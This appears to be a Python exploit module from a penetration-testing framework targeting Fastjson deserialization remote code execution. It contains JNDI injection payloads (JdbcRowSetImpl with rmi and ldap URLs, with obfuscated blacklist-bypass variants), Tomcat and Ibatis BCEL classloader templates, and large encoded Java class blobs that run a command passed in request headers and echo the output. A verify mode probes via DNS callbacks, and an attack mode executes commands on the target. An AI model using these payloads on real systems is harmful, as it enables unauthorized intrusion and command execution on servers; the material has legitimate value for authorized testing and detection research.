from time import sleep
from util.ExpRequest import ExpRequest,Output
from operator import methodcaller
from ClassCongregation import Dnslog#通过Dnslog判断
import json

class Fastjson():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.retry_time = int(env.get('retry_time'))
        self.retry_interval = int(env.get('retry_interval'))
        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.linux_cmd = env.get('cmd', 'echo VuLnEcHoPoCSuCCeSS')
        self.status = env.get('status')

    def FastjsonDeserialization(self):
        DL=Dnslog()
        appName = 'Fastjson'
        pocname = 'FastjsonDeserialization'
        method = 'post'
        desc = 'fastjson在处理以@type形式传入的类的时候，会默认调用该类的共有set\get\is函数'
        Headers = {
            'Content-Type' : 'application/json',
            'Connection' : 'close',
            'Testecho': self.cmd,
            'cmd': self.cmd
        }
        #use_fastjson
        a = '{"@type":"java.net.Inet4Address","val":"%s"}'%DL.dns_host()
        b = '{"@type":"java.net.Inet6Address","val":"%s"}'%DL.dns_host()
        c = '{{"@type":"java.net.URL","val":"%s"}:"0"}'%DL.dns_host()
        d = 'Set[{"@type":java.net.URL","val":"%s"}]'%DL.dns_host()
        e = '{"@type":"java.net.InetSocketAddress"{"address":,"val":"%s"}}'%DL.dns_host()
        f = '{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"%s"}}""}'%DL.dns_host()
        
        #1
        payload1 = '{"b": {"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "rmi://%s/Exploit","autoCommit": True}'%DL.dns_host()
        # 1.2.25-41版本
        payload2 = '{"@type":"Lcom.sun.rowset.RowSetImpl;","dataSourceName":"ldap://%s/Exploit","autoCommit":true}'%DL.dns_host()
        # 1.2.25-45版本（黑名单绕过，需要有第三方组建ibatis-core 3:0）
        payload3 = '{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://%s/Exploit"}}'%DL.dns_host()
        #2
        payload4 ='{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://%s/Exploit","autoCommit":true}}'%DL.dns_host()
        #3
        payload5 ='{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://%s/Exploit","autoCommit":true}'%DL.dns_host()
        #4
        payload6 = '{"e":{"atype":"java.lang.Class","val":"\\x63\\x6f\\x6d\\x2e\\x73\\x75\\x6e\\x2e\\x72\\x6f\\x77\\x73\\x65\\x74\\x2e\\x4a\\x64\\x62\\x63\\x52\\x6f\\x77\\x53\\x65\\x74\\x49\\x6d\\x70\\x6c"},"f":{"\\x40\\x74\\x79\\x70\\x65":"\\x63\\x6f\\x6d\\x2e\\x73\\x75\\x6e\\x2e\\x72\\x6f\\x77\\x73\\x65\\x74\\x2e\\x4a\\x64\\x62\\x63\\x52\\x6f\\x77\\x53\\x65\\x74\\x49\\x6d\\x70\\x6c","dataSourceName":"ldap://%s/Object","autoCommit":true}}'%DL.dns_host()
        #5
        payload7 = '{"fybm3i": {"\\u0040type": "\\x63o\\u006D\\u002Es\\x75n.\\u0072ows\\u0065\\u0074.Jdbc\\x52\\x6F\\u0077\\x53e\\u0074\\u0049m\\x70l","dataSourceName": "ldap://%s/Object","autoCommit": true}}'%DL.dns_host()
        #BasicDataSource 目标不出网
        IbatisTemplate = """{"x":{{"@type":"com.alibaba.fastjson.JSONObject","name":{"@type":"java.lang.Class","val":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},"c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource","key":{"@type":"java.lang.Class","val":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driver":"%s"}}:"a"}}"""
        #tomcat6、7
        Tomcat7Template = """{{"@type": "com.alibaba.fastjson.JSONObject","x":{"@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "%s"}}: "x"}"""
        #tomcat8+
        Tomcat8Template = """{{"@type": "com.alibaba.fastjson.JSONObject","x":{"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "%s"}}: "x"}"""
        #输出案例
        TomcatEchoTemplateStatic = '$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$9dX$Jx$5cU$V$fe$ef$9b$e5$bd$99$bc$a4$c94i$3bPJ$5bZ$3aY$a7$b4eI$C$5d$926m$m$J$d8D$ea$b4$88$bcL$5e$92i$t$f3$86$997M$8b$hJ$dd$X$c4$95$a0$88$a2$Q7$94$a0N$C$95R$5c$Aq$c1$V$R$VWTpA$Fe$b3$z$ff$7do$92N$c2$U$3e$ed$97$dc$7b$df$b9g$f9$cf$b9$e7$9c$7b$d3$fb$8f$deq$I$c0ZQ$VD$Q$ef$d0$f0$ce$m$fcx$97$i$de$ad$e1$3d$w$de$ab$e2$b2$A$cap$b5$q$bdO$c55$w$de$l$e4$f7$H$82$f8$m$3e$q$85$3e$ac$e1$pr$f3Z$Vc$g$ae$d3$f0Q$f9$f51$V$d7$cb$f9$e3A$d4$e0$86$m$3e$81O$ca$e1$c6$m$3e$85O$cb$e1$s$N7$H$d1$85q$VW$ca$ef$cfh$f8l$Q$ab$f19$N$9f$d7$f0$F$V$b7h$f8$a2$86$_i$b8U$c5$84$86$dbT$7c$b9$Mu$f8$8a$i$be$aa$n$afaR$c3$94$8a$db5$dc$n$F$Pj$f8$9a$86$3b5$i$d2pW$Q$87q$b7$a4$7e$5d$c374$7cS$c3$b74$dc$a3$e1$5e$V$f7$a9$f8v$Q$hp$bf$i$be$T$c4w$f1$bd$m$d6$e3$fb$g$k$90$f3$P$e4$f0C$v$fa$p$J$ef$c7R$d3O$82$f8$v$k$M$o$82$9f$a9xH$c0$7fn$o$95$b0$d7$Lx$o$b5$X$Lx$db$ad$BS$60$5eW$oe$f6$e4F$fa$cdL$9f$d1$9f$q$r$d4e$c5$8d$e4$c5F$s$n$bf$LD$af$3d$9c$c8$K$b4v$c5$ad$91$e8$a0$99$Y$b6RC$d1$e4$80$91$8e$da$e6H$3ai$d8f$b4$d76$ecD$3c$dag$8d$c4$N$7bK$7c$d8$ea$x$ec$b8$h$ad$C$81$d1L$c26$db$ac$81$fd$C$L$p$5d$bb$8d$bdF4iP$d1$85$fd$bb$cd$b8$dd$ba$abM$C$f3$c4$93$b4TU$b4$dd$9e4$b2Y$ca$97$a5$cc$d1$ceT$d66Rq$H$e7$8b$U$Q$t$85$d7$d0$d7Dj$af$b5$87L$82$bf$cb$e7$aa$ea$b1$ec$O$x$97$g$d8$b2$_n$a6$ed$84$95$a2$a0$c7$ea$dfM$f1$feM$99$8c$80$b2$abM$a0$9c$b8$e3$7b$ba$8d$b4$T$C$e6$89$40pF$82$I$7dC$a6$ddA$bc$e7$94$f0$a4$88$d2kg$S$a9$a1$d6$da$92h$f7$g$993$F$96$W$ed$f5X$bd$b9$f8pG$c2L$ce$82$t9W$bb$d3$Z$b3$5d$_$e8w$f7$e8z$b8h$_c$O$si$v$ea$a8$x$b0$acU$f1s$a7B$ae$X$d0$ce$8d$t$LI$e1$93$9a$d7$K$d4$U$89$X$Dp$f6$a9$7e$fe$aeR$b6$9d$dd3$K3q$8aN$d7X$b3$40$a5$cb$9f$b3$T$c9hW$o$3b$ed$f6$d9$b3$bd$e8$h$ce$98$c64$c4$b3$dci$j$f5$ec$9cc$b1$c0$a7$e2a$d6$90S$d8$T$y1$V9$kN$af$95$cb$c4$cd$8e$84$cc$d7SN$94$86MR$97$8en$f4$I$ac$b02CMF$da$88$P$9bM$b6$c3$df$qa6$f5$e7$G$9b$da$f6$dbf$fbp$$$b5G$c7$_$f0K$j$af$c2$af$Y$af$aci$cb$N$9e$fe$bc99$a5$e3$R$ec$d0$f1k$fc$86$$$cf$3dj$a6$f3qRg$ca6$87$cc$8c$c4$f0$5b$V$bf$d3$b1$L$bf$d7$f1$H$3c$w$a0$OX$3bd$89$e8$f8$a3$d4$b3$f4$e5$f2$96$c1$91$yM$a9$84$e5$An$cb$N$O$9a$cc_$efh$c6H$eb$f8$T$fe$y$b0$e4$a5sK$c7cxTby$9cy$a1$e3$_$f8$ab$8e$bf$e1$ef$M$b0$8e$t$f0$P$j$ff$c4$bf$I$ccv$e2N$_$H$40tO$e2$v$g1$f7$99q$j$ff$c6$7f$b8$k$b6$ed4$cb$ce62$ac$K$k$edq$a3$dbs$a9$94$dbC$fc$b2$87$ac$60v$a8$c3Fj$m$v$81$fa$87$92V$bf$91$y$f81$t$ebx$a4$e9$8c$V7$b3Y$x$c3$88W$cc$ce$p$jO$e3$Z$89$f5Y$Wo$c6$bc$9c$ed$81$a6$b7$9b$d94$ab$93$d6$C$fc$daF$cc$d2L$e5$dc$94$e5Q$f6$99Y$dbdz$e8x$O$cf$93$9dG$x3$qGK$Bc$60$60Z$d4$T$l$Z$mb$x$db$942F$d8$F$fe$ab$e3$I$8e$ea8$sC$e0$lM$a4$G$acQ$ee$93$ab$89$f1$60$eb$88$c6$f9$Z$edO$a4$a2$d9a$7e6$c6$a7$P$dfA$de$h7R$v$a9w$d1qH$X$b9N$b6$e5$S$c9$B$t$_$Et$n$84$a2$K$8f$$$bc$c2$t$v$7e$aa$bad$93$$T$a1$e9$o$80$a7t$R$Ue$3a$fa$f0J$5d$e8$a2$5c$V$V$ba$98$t$c9$952$b1$9b$ff$ef$$$cd$c6$7c$82$f61$x$8an$Z$d2$d1A$x$d3$c3$b8$I$ac$8c$bct$cf$9b$ee$e1$d5$91$d2$9d$b0$_v$d1$WF$8a$87$b6$d9$8c$t$8d$8c9$d0m$da$c3$Wml$y$a1y$d7$8b4$d7$96h$7b$ae$G$a9$3d$d2$vo$96E$tba$c4J$5dG$_$s$95$c4$ae$R$b4$D$82i$i$v$e5$b3L$c5iC$95E$k$W$e2$da$f82$a1$9b$db$c5$cb$a9$a27$9763q$d7hM$vy$ba$5b$ce$94$de$U$97$a9$95p$ef$f0$c8N$e7$7eu$w$f4$f4$S$O$97$f4$ae$3c$9e$cbd$cc$94$3d$7d$e4$b3$Pp$a6oWP$ab$fb$b15c$e5$d8$L$c2$r$f8$9c$z2$abdv$d3f$b6$b6$99$fbD$8b$5b$v$dbH$c8k$f6$e4b$a0$ed$c3F$a6$d7$bc$3cg$f2$F$d0Z$cb$cb$c1$9bM$5ca$3aO$9aN$Z$88$ce$92$$$a8$89$ec$96$91$b4$bd$df$e1$db9$bb$j$ecg$X$Yq$7b$H$eb$90A$95l$a7$bf$cc$89$cc$e0$y$b3$ad$$k$d4$cc$b4$h$b2$e5$y$88$94$b8$ie$c8$7d$7c$b3dl$J$b0XK$a1$ee$5bg$dd$O$F$a2$h$d0$ceT$3a$c7$ae$c4$d0$8d$c8$XSA8aE$8b6$u$be$uRrCZ$d6sYs$b3$99L$8c$f0Va$d7Yub$c7$8a$db$93$y$99$94$b9$cfvs$bbp$e3y$p$b5$ce$b3$e8x$a4$S$92$bc$uR$ac$e0$f8$8e$ac$f5Rt$ea$b4$ad$e9$$$3c$_$cd$d9v$kZ$7d$Z$pnb$Z_$afA$c8$7f$5e$IyKs$bc$90_Q$ce$82$b3$afn$Sb$82$L$F$Xq$f4$3bD$V$af$e0$a8$bb$M$d8$8e$5e$ceA$d9$h$c9Ea$b1$8bO$7f$liS$ne$K$9e$ee$86$3c$bc$3d$N$n$9f$ffN$f8c$9e$f9P$7bc$de$db$a0$f5$c6$7cr$cc$p$d0$e8$bb$T$c1$98$a7$9etwu$Qe1$cf$qt$S$e4$b2$fe$90$5c$93$b3$7cG$5d$k$V$a1y$5eGS$D$v$95u$5eG$a2$d1$d9$j$c7$d6$eeP$886$7b$gC$f3$bd3$e6$a4$Jo$c1$E$d9Z$bc$c5Z$g$8b$b4$84$bd$8e$9a$J$c7$b34$b2$a8$82$c7$f1$bb$ce$JR$H$fd$dfJ$df$b6$d1$e7N$ee$f7$90$e3$7c$d8$b8$AW0$8c$d72$7c$93$f4_$c6f$hc$e4$c7n$5c$8c$j$8cI$ZL$begb$d4u$F$ce$c3N$d2$3c$e4$3e$95$P$91$Y$c3n$a3$j$97$e0$d5$e4c$c4p$vipV$af$c1e$c4ap$5d$G$e5idU$f4$3fO$d6x$e1$ac$o$84$c4$c7$81$hr$3cH$952$e4$cd$a2$5b$3a$d7$d38$l$c1$9b$b0$a0$b1$3e$8f$ea$eeq$e9sc$k$Lz$c6$8f$3d$d6p$_$f4$83$a8$89$d5Ob$e1$5d$N$de$3c$W5P$o$7c$xUV$a0$g$L$f9$97$98$eb$f3$g$9e0$e8$a9$c2$f3Uy$b6$V$c4$5dM$3f$W$Sa$98$5e$y$n$fee$c4$bb$92H$9b$88s$z$fa$j$df$d7$RH$98$bf$83$Y$oPB$c2p$c1$a7f$q$Y$T$de$ac8$h$7b$90$e4$ac$d2$ca$88$T$P$e9g$V$bcG$a0$aaH$a9$b0$$T$91$O$e8E$dej$b8$7c$3a$3b$3dO$f2$ab$8c9$b9$d9$d3$3a$85$93$f289$b4x$K$a7$i$c6$S$fety$ce$5b$5c$7f$e8Fey$fd$e25$3d$8d$f7$u$d5t$fc$d4$Wo$d8$hZ$9a$c7$b2$eb$U$b9Z$ce$d5$98x$ae1t$g$c5Z$7ca$df$ddX1$s$k$P$fbB$xI$I$9d$$$87U$ce$d68$b4$W$ff$b8x$80$5b$b5$8e$89$ba$W$bf$e7$y$b5F$N$fboG$bd$c0$8d$e2$96$b0$bfF$bd$j$N$KZ$b4$b0$Wj$yh$94$Z$d6$e4a$861$bb$c2$3e$$$822$f3$C$eeFt$3a7W$f7$3a$dbn$f6$85$ce$90$d9w$Y$ab$r$da$7b0$Y$e6$e1$ac$b9$O$97$86$DRf$ad$x$e3$96Le8$e0$9d$a9$94$w$dc$t$ebCf$ae$cb$ba$ce7$a3$3e$e6$9d6$S$f0M$h$89y$Ly$eem$7dI8g$ce$823V$80s$cd$ff$A$tt$d6$U$ce$ce$e3$9cP$b3$M8$c2$ec$A$ab$a9$b8$85$QB$ad$ac$7f$e2$Y$c7$82$C$f5$5cI$3d$cf$a5$b6$E$c3$81$83X$l$3b$88$N$b1pp$S$h$f3$d8$94G$db$q$daC$9b$f3$d8$92GG$k$5b$a7$b0$8d$k$QZ$99$Dm$M5$t$8d$a1$w$i$98Bg$k$e7$bb$M$a4$f8$c7$R8$a0$8a$f1$a3$dd$d3$l$8a$Y$3f$f2$IO$f6$C$s$fe$F$TL$c3$k$a6$df$As$MJ$ab$b2$9e$b3$5b$A7$a3$d6il$b2$80$abQ$8e$c5$y$81$a5$98$87$V$a8dC$a8$c2z$84$d8$S$e6S$ba$86$f2$8b$a8a$B$93$7e$n$93$fc$q$e4$c8$7d$A$a7$e0j$96$89$y$f5$JJ$3e$c4ry$U$cb$f9d$3cM$ac$c7$K$b1$R$ab$c4$Q$o$c2F$ad$b8$Bu$e2a$d4$b3$H4$u$K$a2$K$cfBY$86$b5$caJ$acS$oX$ac4$e1$ie$N$9a$953Q$ae$b4b$TQnP6$60$a3$d2$8e6$a7$e8$O$Q$df$mqg$d8$92$fc$d4$Ua$5b$c9$R$fb$d5b$M$7bY$7e$g$s$c4$u$8b$$$86$A$f6$89$3cF$b1$P$f2$af$b8$c3$d8$cf$a6$e4G$87x$82$b8c$y$db$3a$a5$8c$r$b9$9bU$b7T$a9$c1k$f1$3aj$5d$40$i$af$a7$84$CEi$c6$h$f0FZ$acVV$d1$e2$95$Q$c4$e1e$D$cb$92$s$8bx$H$w$8fb$81P$b1D$icG$f4$3b$x$VoR$f1f$VW$81$cb$D$ac$f2$K$Vo$RG$e4$ff$b4$5c$c5$9f$e7q$60$bb$8a$b7$d6$eaU$cf$c2$ff$i$7c$c7$88$c8$e3$I$C$cf$c0$d7$seX$faos$ee$a1$b7$bf$A$b3$E$de$u$8f$S$A$A'
        SpringEchoTemplateStatic = '$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5U$5bW$TW$U$fe$O$Z$990$Z$$$89P$e9$85$5el$85$q$K$a3$b57$B$a9$QQ$94$Q$81P$a8$d6$5e$s$93C20$97t$e6D$e9_$e9$l$e8$b3$_Q$db$b5$ba$fa$d4$87$fe$9d$3ev$ad$ae$ee3$93H$d4$b4F$3b$P$fb$ac$b3$f7$fe$f6$e5$3b$fb$9c$f9$e3$ef$9f$7f$Fp$R$87$g$5e$c3$9c$G$D$e7U$5c$d0$90$c0$87R$5cLb$s$85$8f$f0$b1$86O$f0$a9$8a$cf4$5c$c2$bc$U$L$g$WqY$c3$Q$96$92$f8$5c$aeW$a4XNa$F$F$NW$b1$aa$e2$9a$86$93$b8$aebM$c5$N$86$c1E$db$b3$c5$SC$o$9b$dbeP$K$7e$953$8c$Wm$8f$97$9an$85$H$3bf$c5$nM$a6$e8$5b$a6$b3k$G$b6$dc$b7$95$8a$a8$db$n$c3B$d1$f2$5dc$9f$dbu$df$ab$ZN$d5l$Y$82$bb$N$c7$U$dc$u$LS$d8$96Qn$E$b6W$5b$b5$ea$feN$db$S$h$W$Y$92$8b$96$d3$a9$n$e0$a1Lu$60$de3$N$c7$a4$60e$nq$e4$95$O$f8$f7M$k$8aeA$9aJS$f0$u$af$l$d4$8c0$K$bd$l$98$$$bf$ef$H$87$c6$7d$5e1$y$df$T$fcH$Ym$90$b1$fd$y$98$o$a6$eaB4$da$O$M3Q$d2$p$p$e4$c1$3d$87$LC$g$8d5$S$e5X$d1$8e$408$3d$c6$85$N$df$L$89$83$ec$L$81$b1$t$n$T$96$5be$60$E$9a$e8jq$f5$c8$e2$Na$fb$ky$M$T$x$d6$e1$86$d9$88$I$a6$b3b$d0$ca$7e3$b0$f85$5b$S$3e$f5o$3c$ce$c9x$3aNaR$c5M$j$eb$u2$5c$e9$97$9d$a7$5b$3c$sI$c7$GJ$3anaS$c5$96$8em$94U$ec$e8$f8$C4$u$e9$a8$81$a6$b0$j$a3l$99$9e$c7$D$V$7b$3a$be$c4m$jw$f0$95$8a$bb$3a$be$c67$b2$a4o$Z$G$ee$$$eb$f8$OTa$F$96$8a$aa$O$8e$7d$V5$ju$d8$M$t$7b$b0$a1$e3$A$93$M$97$5ey$b4$Y$c6$8e$c3$de$aa$ip$8b$8ey$f1$r$t$a6$Q$ab$d7$7c$a7$ca$D$86$f1Z$P$9a$Y$$gs$ffk$U$b5$e3$b0$M9$K$d6$ef$y$a6j$c7$D$c6$90$ef$D$f9d$Y$cf$f4$95$83a$88R$acq3j$7f$3a$fb$fc$d5$cc$f5$ba$adc$cf$ea$YT$3b$5cu$h$e2$87$e8$a5$b9$d3$Z$a0$c8e$bb$e9$J$db$e5m$k$3a$9b$89lw$e8$b6$9ab$x$fc$88$d3$e1$ce$bc$a0$96$cd$c0$b7x$u$d9M$3f$a7d$Y$a1L7$bcFS$Q$92$9b$$$c3$a9N6$db7$ba$M$E$9f$cc$f64$c8$d7Ro$86$fc$wwl$d7$W$92$9e$ff$u$a9$fb$a2$c8$k$3c$g$J$g$a7lO$f6$a6$fb$3b$c4$f8l$f6$828yw$D$9b$U$a8mX$e8$dc$ae$a7$d5t$krV$85$e3I$a2$7b$94M$dd$8dF$k$d1$8b$b4$T$98$W$c7$7b$98$a0$ff$91$fc$G$c0$e4$5bC$f2u$da$Z$b42ZO$e4$l$82$3d$88$cco$90$i$8c$94$g$de$q$a9$c7$Ox$LS$b4$s$f1$f6$T$f0$9fPH$P$ec$3d$c2$c0z$fe7$qZP$8a$f1zb$e3lf$f01$d4$B$94f$7f$c7$f9$d9$W$92$3f$o$f7$L$86n$3f$82F$bbT$L$faC$MgFZ$Ymal$5e9$f7$Yi$8a$aa$b4$90$f9$J$c9$f5$7c$L$e3$P$a2$c4$rl$d1O$_$R$955$87$U$c9aJ$3bBe$8db$ii$w$w$83$yy$UhW$a2$d2$b6$a8$cfm$eap$97J$94$e5$_Q3$F$c2$bd$83w$J$a7$e0$sqq$3ajk$F$ef$e3$D$ca1$8ey$9c$c14$b5$3e$85$L$98$n$bf$EEP$uj$8e$fc$f2$R$R$89$bfPZQqV$n$ffs$RM$b3$ff$A$a7$5b$lW$eb$H$A$A'
        
        payload_list = [payload7, payload1, payload2, payload3, payload4, payload5, payload6]
        #输出类
        output = Output(pocname)
        #请求类
        exprequest = ExpRequest(pocname, output)

        try:
            #_verify
            if self.vuln == 'False':
                for payload in payload_list:
                    #data = json.dumps(payload)
                    resp = exprequest.post(self.url, headers=Headers, data=payload, timeout=self.timeout, verify=False)
                    sleep(0.5)
                    if DL.result():
                        info = "存在Fastjson反序列化远程代码执行漏洞: {}".format(payload)
                        output.echo_success(method, info)
                        self.status = 'success'
                        return
                output.fail()
            #_attack
            else:
                request = exprequest.post(self.url, headers=Headers, data=Tomcat8Template%TomcatEchoTemplateStatic, timeout=self.timeout, verify=False)
                print(request.headers)
                if 'java.sql.SQLException' in request.text:
                    index = request.text.index('java.sql.SQLException')
                    print(request.text[0:index])
                else:
                  print(request.text)
        except Exception as error:
            output.error_output(str(error))

def check(**kwargs):
    result_list = []
    result_list.append('----------------------------')
    ExpFastjson = Fastjson(**kwargs)
    if kwargs['pocname'] != 'ALL':
        func = getattr(ExpFastjson, kwargs['pocname'])#返回对象函数属性值，可以直接调用
        func()#调用函数
        return ExpFastjson.status
    else:#调用所有函数
        for func in dir(Fastjson):
            if not func.startswith("__"):
                methodcaller(func)(ExpFastjson)
                result_list.append(func+' -> '+ExpFastjson.status)
                ExpFastjson.status = 'fail'
    result_list.append('----------------------------')
    return '\n'.join(result_list)




















